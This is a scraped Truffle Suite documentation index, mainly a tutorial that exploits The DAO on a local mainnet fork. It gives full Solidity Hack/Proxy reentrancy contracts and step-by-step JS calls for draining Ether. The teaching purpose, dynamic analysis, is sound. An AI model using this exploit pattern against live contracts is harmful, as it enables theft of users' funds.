waiting days for a single step will take mere milliseconds. Bon voyage! Step 1: Forking from the main chain \u00b6 This step requires you to sync the live chain using go-ethereum or any other Ethereum client . Because we'll be forking from a previous state, you must sync the whole chain ; you can't use the --fast option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we'll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it's intended to be installed. Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we'll assume you have your client accepting requests on http://127.0.0.1:8545 , the default for most clients. To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We're creating a programmable script that exploits The DAO, so you'll first need to install the required dependencies and include them within the script. We won't be writing the whole script here, but you can follow along via the script on github . var web3 = new Web3 ( TestRPC . provider ({ fork : \"http://127.0.0.1:8545@1599200\" })); Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from http://127.0.0.1:8545 (our live chain). As well, we tell it that we want to fork from block 1599200 ; this is a block that was mined right before the DAO presale ended. Step 2: Participate in the presale \u00b6 Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens: var DAO = DAOContract . at ( \"0xbb9bc244d798123fde783fcc1c72d3bb8c189413\" ); web3 . eth . sendTransaction ({ from : accounts [ 0 ], to : DAO . address , value : web3 . toWei ( 90 , \"Ether\" ), gas : 90000 }, callback ); Note that the accounts array is populated by our script, which used web3.eth.getAccounts() to get a list of all available accounts provided to us by the TestRPC. As well, we've pointed an instance of the DAO contract to the address 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 , which is the original DAO account and code. Again, for example's sake we're using some shorthand, so please follow along with the script on github . Step 3: Wait for the presale to end \u00b6 Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, evm_increaseTime : web3 . currentProvider . sendAsync ({ jsonrpc : \"2.0\" , method : \"evm_increaseTime\" , params : [ 86400 ], // 86400 seconds in a day id : new Date (). getTime () }, callback ); This will tell the TestRPC to alter its timestamp by 86400 seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached. Step 4: Deploy our hack contract to the network \u00b6 This hack contract was written by me, but it was heavily influenced by this writeup written by Phil Daian from Hacking, Distributed . Many thanks go to him for such a clear writeup. From Github: ./contracts/Hack.sol import \"DAOInterface.sol\" ; contract Proxy { DAOInterface DAO ; address owner ; function Proxy ( address _dao ) { owner = msg.sender ; DAO = DAOInterface ( _dao ); } function empty () { if ( msg.sender != owner ) return ; uint balance = DAO . balanceOf ( this ); DAO . transfer ( owner , balance ); } } contract Hack { uint public proposalID ; DAOInterface public DAO ; uint public calls_to_make ; uint public calls ; Proxy public proxy ; function Hack ( address _dao ) { DAO = DAOInterface ( _dao ); calls = 0 ; proxy = new Proxy ( _dao ); calls_to_make = 1 ; } function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } function voteYesOnProposal () { DAO . vote ( proposalID , true ); } function fillProxy () { uint balance = DAO . balanceOf ( this ); DAO . transfer ( address ( proxy ), balance ); } function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } } First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they're stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely. makeSplitProposal() , voteYesOnProposal() , and splitDAO() (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later. fillProxy() takes the Hack contract's DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, proxy.empty() returns the tokens back to the Hack contract. runHack() gets the hack started, and the fallback function function() {...} runs the hack until we've reached the maximum amount of calls we can make within our given gas limit. Step 5: Transfer DAO tokens to Hack contract \u00b6 Now that our Hack contract is deployed, we need to transfer the DAO balance from accounts[0] to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle: DAO . transfer ( Hack . address , balances . accountDAO , { from : accounts [ 0 ]}). then ( function () { callback (); }). catch ( callback ); Step 6: Make a split proposal \u00b6 Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you'll be able to move your Ether into your own DAO. I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO's newProposal() function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including this wiki page , this wiki page , this wiki page as well as the DAO code itself (to future developers, I'd highly recommend encapsulating the complexity if you have two \"things\" of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function: function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } Couple points here: The first input is the recipient of the proposal -- or in our case, the curator of the new DAO that's created -- which is the Hack contract itself. 0x0 is the amount of Ether to send with the proposal. We're told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically. \"Lonely, so Lonely\" is a short description of the proposal. This is the same description the original attacker used, so it's only fitting to use it ourselves as well. transactionData is any extra input used to call functions on the proposal's contract were this a real proposal. Since this is a split we're supposed to leave it blank, but the only way to do so is to create a new bytes type in memory and pass that empty type along. 0x93a80 is one week in seconds, converted to hexadecimal. true means we're actually splitting, and not creating a normal proposal. When I executed the above function from Javascript I also watched for the ProposalAdded event fired off by the DAO, which told me the id of the proposal created. You can see how I did that in the script . Step 7: Vote yes on the proposal \u00b6 This is a simple function call. Like the makeSplitProposal() function above, the voteYesOnProposal() function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it's encapsulated in the Hack contract, it's as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted: function voteYesOnProposal () { DAO . vote ( proposalID , true ); } Step 8: Wait a week \u00b6 The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I'll leave that as an exercise for the reader, or you can just review the script . Step 9: Perform our first split \u00b6 The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO's address that we can later use to show our total bounty. We've set up the hack contract to only make one split the first time we call splitDAO() (see calls and calls_to_make ; calls_to_make defaulted to 1 when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we'd trigger the hack by continuing to make splits from the fallback function. function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } Like when we created a proposal we also wait for an event here, this time the Transfer event, but again you can see how we did that within the script . Step 10: Run the hack \u00b6 This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts. function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } The execution logic looks like this: Call runHack() to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don't go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the splitDAO() function is called, eventually calling DAO.splitDAO() , which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it's the action of sending the reward -- _recipient.call.value(_amount)() in ManagedAccount.sol -- that enables us to perform the rest of the hack. Sending the reward to the Hack contract triggers the Hack contract's fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn't made too many, it then calls another split via the splitDAO() function. If it has called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract's balance as zero. The execution will loop in this way -- split, fallback function, split, fallback function -- until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether. You can see via the script where the balance goes. After each set of iterations -- in our case, 26 iterations per set -- you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at Hacking, Distributed for this revelation . Running the script \u00b6 As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies: $ git clone https://github.com/tcoulter/dao-truffle $ cd dao-truffle $ npm install Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First install Truffle then run: $ truffle compile From here, you can run the script by simply running: $ node index.js And now you've exploited the DAO. Cheers! But, Dynamic Analysis? \u00b6 Of course you might be asking, \"How does this apply to dynamic analysis? You've only shown me how to exploit the DAO!\" Yes, that's true, but dynamic analysis was the trojan horse. Because this hack can be made better , to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I've provided you. You've been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out? As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so... $ testrpc --fork http://127.0.0.1:8545@1599200 ... and then use Truffle's console to interact with the DAO directly: $ truffle console Good luck, and may all your code be secure!", "title": "Truffle Suite"}, {"location": "guides/chain-forking-exploiting-the-dao/#what-is-dynamic-analysis", "text": "Dynamic Analysis is the process of executing code and data in real-time with the hope of finding issues during execution. It's a similar process to exploratory testing , with the same goals, but perhaps more technical. Dynamic analysis on the Ethereum blockchain has historically been costly at worst and tedious at best. If you were to perform dynamic analysis on the live Ethereum chain, transactions would cost you hard-earned Ether, which might limit the tests you perform. Moving away from the live chain is possible, but it's a tedious process to move the live data over to a separate chain, and you'd have to perform this process multiple times if you end up mucking with the chain state during testing.", "title": "What is Dynamic Analysis?"}, {"location": "guides/chain-forking-exploiting-the-dao/#hello-testrpc", "text": "In early September, ethereumjs-testrpc released its --fork feature meant to solve the issues with dynamic analysis on the live chain (or any chain, for that matter). It did so by allowing you to \"fork\" from the live chain -- i.e., create a new blockchain that starts from the last block on the existing chain -- allowing you to make transactions on the new chain without spending real Ether or changing the existing chain's state. What's more, you can reset the chain back to its original state by simply restarting the TestRPC. This feature has big implications for many other areas of development, but today we'll talk about how we can use it for dynamic analysis.", "title": "Hello, TestRPC"}, {"location": "guides/chain-forking-exploiting-the-dao/#exploiting-the-dao", "text": "One great feature of the TestRPC is that it's scriptable. Although this tutorial will show you how we exploited it, with the TestRPC's new --fork feature all you have to do is download the code and exploit it yourself, simply by running one command! You can find the full exploit code as a Truffle project here , and the original demo video below.", "title": "Exploiting The DAO"}, {"location": "guides/chain-forking-exploiting-the-dao/#overview-of-the-exploit", "text": "The DAO exploit has many steps, and many of those steps are simply waiting for time to move forward. Here's a general overview of the steps we'll perform: Fork from the live chain at a block just before the DAO presale ended. We fork at this point in time to have as much Ether as we can to exploit (for example's sake). Participate in the presale by buying DAO tokens. Wait one day for the presale to end. Deploy our Hack contract to the network that we will eventually use to exploit the DAO. Transfer the DAO tokens we purchased to the hack contract. Have our DAO contract make a split proposal, which is required to perform the exploit. Vote yes on our own proposal (someone has to). Wait a week for our proposal voting time to end (we end up waiting eight days for good measure). Perform our split, which starts the hack. Then continue it in a loop!", "title": "Overview of the exploit"}, {"location": "guides/chain-forking-exploiting-the-dao/#aside-traveling-through-time", "text": "In the above overview, there are a few steps that require us to wait days to complete. Don't worry: the TestRPC has features that allow us to jump forward in time, so waiting days for a single step will take mere milliseconds. Bon voyage!", "title": "Aside: Traveling through time"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-1-forking-from-the-main-chain", "text": "This step requires you to sync the live chain using go-ethereum or any other Ethereum client . Because we'll be forking from a previous state, you must sync the whole chain ; you can't use the --fast option (or similar) to only sync the latest state. To keep this tutorial as succinct as possible, we'll leave syncing the chain up to you as the steps vary widely based on the client chosen and the environment where it's intended to be installed. Once you have your client running, ensure it has an open RPC API running and available to you. For this example, we'll assume you have your client accepting requests on http://127.0.0.1:8545 , the default for most clients. To fork from the live chain, we first need to run an instance of the TestRPC, pointing it at the correct host and port. Remember: We're creating a programmable script that exploits The DAO, so you'll first need to install the required dependencies and include them within the script. We won't be writing the whole script here, but you can follow along via the script on github . var web3 = new Web3 ( TestRPC . provider ({ fork : \"http://127.0.0.1:8545@1599200\" })); Here, we create a new instance of the TestRPC, forking from a chain which accepts requests from http://127.0.0.1:8545 (our live chain). As well, we tell it that we want to fork from block 1599200 ; this is a block that was mined right before the DAO presale ended.", "title": "Step 1: Forking from the main chain"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-2-participate-in-the-presale", "text": "Participating in the presale is just a matter of sending Ether to the DAO contract. We can use a normal transaction to do this. Below, we buy 90 ETH worth of DAO tokens: var DAO = DAOContract . at ( \"0xbb9bc244d798123fde783fcc1c72d3bb8c189413\" ); web3 . eth . sendTransaction ({ from : accounts [ 0 ], to : DAO . address , value : web3 . toWei ( 90 , \"Ether\" ), gas : 90000 }, callback ); Note that the accounts array is populated by our script, which used web3.eth.getAccounts() to get a list of all available accounts provided to us by the TestRPC. As well, we've pointed an instance of the DAO contract to the address 0xbb9bc244d798123fde783fcc1c72d3bb8c189413 , which is the original DAO account and code. Again, for example's sake we're using some shorthand, so please follow along with the script on github .", "title": "Step 2: Participate in the presale"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-3-wait-for-the-presale-to-end", "text": "Since we forked to a block that was mined the day before the presale ended, we have to jump forward in time by at least a few hours to get past the presale deadline. We decided to jump a day by calling a special method provided by the TestRPC, evm_increaseTime : web3 . currentProvider . sendAsync ({ jsonrpc : \"2.0\" , method : \"evm_increaseTime\" , params : [ 86400 ], // 86400 seconds in a day id : new Date (). getTime () }, callback ); This will tell the TestRPC to alter its timestamp by 86400 seconds. This feature allows you to write tests that have a time component, and in our case allows us to continue executing code after a deadline is reached.", "title": "Step 3: Wait for the presale to end"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-4-deploy-our-hack-contract-to-the-network", "text": "This hack contract was written by me, but it was heavily influenced by this writeup written by Phil Daian from Hacking, Distributed . Many thanks go to him for such a clear writeup. From Github: ./contracts/Hack.sol import \"DAOInterface.sol\" ; contract Proxy { DAOInterface DAO ; address owner ; function Proxy ( address _dao ) { owner = msg.sender ; DAO = DAOInterface ( _dao ); } function empty () { if ( msg.sender != owner ) return ; uint balance = DAO . balanceOf ( this ); DAO . transfer ( owner , balance ); } } contract Hack { uint public proposalID ; DAOInterface public DAO ; uint public calls_to_make ; uint public calls ; Proxy public proxy ; function Hack ( address _dao ) { DAO = DAOInterface ( _dao ); calls = 0 ; proxy = new Proxy ( _dao ); calls_to_make = 1 ; } function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } function voteYesOnProposal () { DAO . vote ( proposalID , true ); } function fillProxy () { uint balance = DAO . balanceOf ( this ); DAO . transfer ( address ( proxy ), balance ); } function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } } First, this contract file contains two contracts: A Proxy contract, and a Hack contract. The Hack contract performs the splits, and is the main entity and address that exploits the DAO. The Proxy contract is a place for the Hack contract to stash its DAO tokens before they get flushed at the end of one run through the loop. Because they're stashed in a different address, the final iteration will have no DAO tokens to zero out, and thus we can continue the hack indefinitely. makeSplitProposal() , voteYesOnProposal() , and splitDAO() (when called on its own), are all functions required to set up the hack. Since the Hack contract is the main entity that holds the DAO tokens, it must perform this setup in order to execute the hack later. fillProxy() takes the Hack contract's DAO tokens and transfers them to the address of the Proxy contract, a vital part of making the hack indefinite. As well, proxy.empty() returns the tokens back to the Hack contract. runHack() gets the hack started, and the fallback function function() {...} runs the hack until we've reached the maximum amount of calls we can make within our given gas limit.", "title": "Step 4: Deploy our hack contract to the network"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-5-transfer-dao-tokens-to-hack-contract", "text": "Now that our Hack contract is deployed, we need to transfer the DAO balance from accounts[0] to our Hack contract so that it can exploit the hack. We do this by using our contract abstraction provided by Truffle: DAO . transfer ( Hack . address , balances . accountDAO , { from : accounts [ 0 ]}). then ( function () { callback (); }). catch ( callback );", "title": "Step 5: Transfer DAO tokens to Hack contract"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-6-make-a-split-proposal", "text": "Making a split proposal is part of the DAO. A split proposal is a suggestion to all other DAO token holders that you should remove your Ether from the main DAO and create a DAO all your own. You can vote on this proposal to ensure it goes through, and after seven days if the split is approved by a majority of voters, you'll be able to move your Ether into your own DAO. I found creating a split proposal rather confusing. Creating a split is similar to creating a normal proposal, but it requires much less data as input to the DAO's newProposal() function. Still, you must satisfy every input, and it took trial and error to figure out exactly what inputs would do the trick. I used a number of resources, including this wiki page , this wiki page , this wiki page as well as the DAO code itself (to future developers, I'd highly recommend encapsulating the complexity if you have two \"things\" of the same general type where one is far simpler than the other). Eventually I was able to find the right combination, and I put it in its own method in the Hack contract above. Now, creating my proposal was simply a matter of calling that single function: function makeSplitProposal () { // 0x93a80 == 604800 == 1 week in seconds bytes memory transactionData ; proposalID = DAO . newProposal ( this , 0x0 , \"Lonely, so Lonely\" , transactionData , 0x93a80 , true ); } Couple points here: The first input is the recipient of the proposal -- or in our case, the curator of the new DAO that's created -- which is the Hack contract itself. 0x0 is the amount of Ether to send with the proposal. We're told to leave this blank when creating a split, which means to leave it zero if calling the function programmatically. \"Lonely, so Lonely\" is a short description of the proposal. This is the same description the original attacker used, so it's only fitting to use it ourselves as well. transactionData is any extra input used to call functions on the proposal's contract were this a real proposal. Since this is a split we're supposed to leave it blank, but the only way to do so is to create a new bytes type in memory and pass that empty type along. 0x93a80 is one week in seconds, converted to hexadecimal. true means we're actually splitting, and not creating a normal proposal. When I executed the above function from Javascript I also watched for the ProposalAdded event fired off by the DAO, which told me the id of the proposal created. You can see how I did that in the script .", "title": "Step 6: Make a split proposal"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-7-vote-yes-on-the-proposal", "text": "This is a simple function call. Like the makeSplitProposal() function above, the voteYesOnProposal() function was added to the Hack contract to ensure the Hack contract was the entity voting yes. Since it's encapsulated in the Hack contract, it's as simple as calling a single function from Javascript. We need only pass along the proposal id and our vote to ensure our vote is counted: function voteYesOnProposal () { DAO . vote ( proposalID , true ); }", "title": "Step 7: Vote yes on the proposal"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-8-wait-a-week", "text": "The minimum waiting period for a split proposal is one week. Since we created our proposal above with a waiting period of a week, we need to tell the TestRPC to jump forward that much time (in seconds). I'll leave that as an exercise for the reader, or you can just review the script .", "title": "Step 8: Wait a week"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-9-perform-our-first-split", "text": "The hack itself is a continuous stream of split requests, however for our script we start by splitting the DAO once ourselves. We do this mostly for the purposes of the script so we can get the newly created DAO's address that we can later use to show our total bounty. We've set up the hack contract to only make one split the first time we call splitDAO() (see calls and calls_to_make ; calls_to_make defaulted to 1 when we deployed the contract). We need to enforce the amount of splits we intend to make because otherwise we'd trigger the hack by continuing to make splits from the fallback function. function splitDAO () { calls += 1 ; DAO . splitDAO ( proposalID , this ); } Like when we created a proposal we also wait for an event here, this time the Transfer event, but again you can see how we did that within the script .", "title": "Step 9: Perform our first split"}, {"location": "guides/chain-forking-exploiting-the-dao/#step-10-run-the-hack", "text": "This is where things get interesting. We performed a significant setup in order to get to this point. Fortunately, all logic of the hack is contained within the Hack and Proxy contracts. function runHack ( uint _calls_to_make ) { calls = 0 ; calls_to_make = _calls_to_make ; proxy . empty (); splitDAO (); } function () { if ( calls < calls_to_make ) { splitDAO (); } else { fillProxy (); } } The execution logic looks like this: Call runHack() to start the hack. Here, we pass in the specific number of splits we want to execute to ensure we don't go over the gas limit. The Proxy contract is then emptied of all its DAO tokens, transferring them back to the Hack contract so they can be used to run the hack. Next, the splitDAO() function is called, eventually calling DAO.splitDAO() , which during execution attempts to give any reward from the split to the recipient of the proposal, our Hack contract. The reward in our case is zero, but it's the action of sending the reward -- _recipient.call.value(_amount)() in ManagedAccount.sol -- that enables us to perform the rest of the hack. Sending the reward to the Hack contract triggers the Hack contract's fallback function. Here, the fallback function tracks how many splits it has made, and if it hasn't made too many, it then calls another split via the splitDAO() function. If it has called the expected amount of splits, it then sends the DAO tokens back to the Proxy contract before the main DAO can record the Hack contract's balance as zero. The execution will loop in this way -- split, fallback function, split, fallback function -- until the preset number of splits have been made. The transaction then exits, is recorded as successful on the blockchain, and is run continuously by our script until the DAO is drained of all its Ether. You can see via the script where the balance goes. After each set of iterations -- in our case, 26 iterations per set -- you can see that Ether funnels from the old DAO to the new DAO and the DAO tokens that allowed us to perform the hack wind up back in the Proxy contract where they started. This is one of the amazing properties of this hack, in that you can run it indefinitely with the same DAO tokens you started with. Again, big thanks to the fine folks at Hacking, Distributed for this revelation .", "title": "Step 10: Run the hack"}, {"location": "guides/chain-forking-exploiting-the-dao/#running-the-script", "text": "As mentioned in step 1, you first need to have a running Ethereum client synced to the live chain. Second, you need to download the code and install all the dependencies: $ git clone https://github.com/tcoulter/dao-truffle $ cd dao-truffle $ npm install Afterward, you need to have Truffle compile all the contracts for you so that their binaries and ABI interfaces will be available. First install Truffle then run: $ truffle compile From here, you can run the script by simply running: $ node index.js And now you've exploited the DAO. Cheers!", "title": "Running the script"}, {"location": "guides/chain-forking-exploiting-the-dao/#but-dynamic-analysis", "text": "Of course you might be asking, \"How does this apply to dynamic analysis? You've only shown me how to exploit the DAO!\" Yes, that's true, but dynamic analysis was the trojan horse. Because this hack can be made better , to the point where you can perform more iterations out of a single transaction and suck more ETH out of the DAO faster than the script I've provided you. You've been given all the tools and tricks you need, including chain forking which allows you to perform dynamic analysis for free. Given that, do you think you can you figure it out? As a hint, it may be helpful at times to interact with the TestRPC from the console rather than through code. You can run the TestRPC via the command line, like so... $ testrpc --fork http://127.0.0.1:8545@1599200 ... and then use Truffle's console to interact with the DAO directly: $ truffle console Good luck, and may all your code be secure!", "title": "But, Dynamic Analysis?"}, {"location": "guides/configuring-visual-studio-code/", "text": "This post was originally published by David Burela on his blog Burela's House-o-blog . Big thanks to David for allowing us publish it here! Visual Studio code is a great tool for editing Solidity smart contracts, and is available on Windows, Mac & Linux. There is a great plugin that enables Syntax highlighting, snippets, and compiling of the current contract (if you aren\u2019t using an external tool) https://github.com/juanfranblanco/vscode-solidity/ This configuration works really well with Truffle (as shown in the final screenshot). You can read how to install Truffle on Windows in my previous post . Step 1: Install Visual Studio code \u00b6 https://code.visualstudio.com/ Easy option on Windows: Just install via https://chocolatey.org/ by using the command choco install VisualstudioCode \u2013y Step 2: Install Visual Studio extensions \u00b6 Go into the extensions section, then install these plugins: Solidity Material Icon Theme Step 3: Enable icon theme \u00b6 Select File \u2013> Preferences \u2013> File Icon Theme . Final result: Sexy workspace \u00b6", "title": "Configuring Visual Studio code for Ethereum Blockchain Development"}, {"location": "guides/configuring-visual-studio-code/#step-1-install-visual-studio-code", "text": "https://code.visualstudio.com/ Easy option on Windows: Just install via https://chocolatey.org/ by using the command choco install VisualstudioCode \u2013y", "title": "Step 1: Install Visual Studio code"}, {"location": "guides/configuring-visual-studio-code/#step-2-install-visual-studio-extensions", "text": "Go into the extensions section, then install these plugins: Solidity Material Icon Theme", "title": "Step 2: Install Visual Studio extensions"}, {"location": "guides/configuring-visual-studio-code/#step-3-enable-icon-theme", "text": "Select File \u2013> Preferences \u2013> File Icon Theme .", "title": "Step 3: Enable icon theme"}, {"location": "guides/configuring-visual-studio-code/#final-result-sexy-workspace", "text": "", "title": "Final result: Sexy workspace"}, {"location": "guides/creating-a-cli-with-truffle-3/", "text": "Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Truffle 3 is out , and it switched to a less opinionated build process. In Truffle 2, the default app from truffle init included a frontend example with build process. Now, there's nothing other than a build folder for your JSON contract artifacts. This opens up the door for testing and building other ( cough command line cough ) types of applications! Intended Audience \u00b6 This is written for those familiar with Truffle and Ethereum, who want to learn how to create a testable, Ethereum-enabled command line application with Truffle. For this tutorial, we'll be building a command line tool that interacts with the Ethereum Name Service (ENS). Getting Started \u00b6 If you were using Truffle beta 3.0.0-9 or below, do not immediately upgrade . Read these release notes and the upgrade guide first. Next, make a new folder and run the following command: $ truffle init You should see the test , build , and migrations directories were created for you -- but no app . Additionally, the build step in the truffle.js file is mysteriously absent. That's ok! This means Truffle is getting out of your way and letting you control the build process. Let's Look at the Example \u00b6 Check out the example app as a reference. I'll be referring to it often so give it a look over if you haven't already. The first thing to look at is the build process. Since Truffle now puts us in control of the build, I've added some custom scripts within package.json to handle building for us: ... \"description\" : \"CLI for ENS deployment\" , \"scripts\" : { \"ens\" : \"babel-node ./bin/ensa.js\" , \"lint\" : \"eslint ./\" }, \"author\" : \"Douglas von Kohorn\" , \"license\" : \"MIT\" , ... I've defined two scripts here: lint for linting my Javascript to keep my codebase so fresh and so clean, and ens for transpiling my Javascript command line tool (using Babel) and running it. That's it! That's the build process. You can run it via npm run lint and npm run ens . Now that that's out of the way, let's dig into how and why I structured my app this way. Building our App: Separation of concerns \u00b6 In order to take advantage of all parts of Truffle while building this tool, we need to separate our code into two distinct pieces. First, we need to write a library which will constitute the bulk of the app, and allow us to perform actions against the ENS contracts quickly and easily from Javascript. Next is the CLI; the CLI will take advantage of the library itself, and will be the user's interface to our application. The Library \u00b6 The library is lib/ens_registrar.js . Let's take a look at the constructor: ... constructor ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) { this . web3 = new Web3 ( provider ) this . Deed = Deed this . Deed . setProvider ( provider ) AuctionRegistrar . setProvider ( provider ) AuctionRegistrar . defaults ({ from : fromAddress , gas : 400000 }) this . registrar = AuctionRegistrar . at ( registrarAddress ) } ... The library constructor requires a few things: the contract interfaces ( AuctionRegistrar & Deed ) the address on the network of the registrar a web3 provider that will be used to connect to the desired Ethereum network and the account address that will provide gas for transactions. It's crucial that the library remain ignorant of the creation of these variables if we want to take advantage of both Truffle's testing pipeline and a CLI. As I see it, there are two ways to use the library: - Through Truffle , which manages contract addresses for testing against different networks (e.g. local, private, ropsten). Truffle makes testing our library easy. - Once we've convinced ourselves that the library is well tested and works properly, we'll want to tell the library where to find our own contracts, provider, and account on the mainnet through the CLI . Let's take a look at how the library is used in both cases. Use #1: Truffle Tests \u00b6 Here's test/ENS.js , a Truffle test that uses the library: import { default as ENSAuctionLib } from '../lib/ens_registrar' const Registrar = artifacts . require ( './Registrar.sol' ) const Deed = artifacts . require ( './Deed.sol' ) contract ( 'ENS integration' , ( accounts ) => { let auctionRegistrar before ( 'set up auction registrar' , ( done ) => { Registrar . deployed (). then (( instance ) => { auctionRegistrar = new ENSAuctionLib ( Registrar , Deed , instance . address , web3 . currentProvider , accounts [ 0 ] ) }). then (() => done ()) }) it ( 'demonstrates that the domain name is available' , ( done ) => { auctionRegistrar . available ( 'test' ) . then (( isAvailable ) => { assert . isTrue ( isAvailable ) done () }) }) ... } Truffle injects a global artifacts.require function, a helper for finding the right compiled contract artifacts within the test environment. The test then finds a deployed instance of the Registrar on the test network via Registrar.deployed() . Now, with the addition of accounts , which is passed in via the contract wrapper (see here) , we have enough to instantiate the library and use it to test that the domain name 'test' is available for auction. Use #2: the CLI \u00b6 Here's index.js , which provides our command line tool, using the library: import { default as ENSAuctionLib } from './lib/ens_registrar' import { default as Web3 } from 'web3' import { default as contract } from '@truffle/contract' const AuctionRegistrar = contract ( require ( './build/contracts/Registrar.json' )) const Deed = contract ( require ( './build/contracts/Deed.json' )) export default function ( host , port , registrarAddress , fromAddress ) { let provider = new Web3 . providers . HttpProvider ( `http:\\/\\/ ${ host } : ${ port } ` ) return new ENSAuctionLib ( AuctionRegistrar , Deed , registrarAddress , provider , fromAddress ) } Here I'm using the same library, @truffle/contract , that artifacts.require uses under the hood. Because I can't rely on the Truffle Suite within the CLI, I have to include the compiled contract artifacts manually. The rest is passed in through the CLI in bin/ensa.js : import { default as initializeLib } from '../index' ... let command = argv . _ [ 0 ] if ( command === 'bid' ) { let { name , host , max , port , registrar , account , secret } = argv let auctionRegistrar = initializeLib ( host , port , registrar , account ) auctionRegistrar . createBid ( name , account , max , secret ) . then (() => console . log ( 'Created bid for ' + name )) } Usage \u00b6 You can use the command line tool against any network that has an ENS registrar deployed. First, choose a command: $ npm run -s ens Usage: bin/ensa.js [ command ] [ options ] Commands: winner Current winner of bid bid Place a bid on a domain name reveal Reveal your bid on a domain name Options: --help Show help Then specify the correct options, including the account and registrar : $ npm run -s ens -- winner -n 'NewDomain' bin/ensa.js winner Options: --help Show help [ boolean ] --host, -h HTTP host of Ethereum node [ default: \"testrpc\" ] --port, -p HTTP port [ default: \"8545\" ] --registrar, -r The address of the registrar [ string ] [ required ] --name, -n The name you want to register [ string ] [ required ] --account, -a The address to register the domain name [ string ] [ required ] Missing required arguments: account, registrar Recap \u00b6 You might be thinking to yourself, \"That was a short tutorial\". That's because it doesn't need to be much longer: Creating a command line application with Truffle is 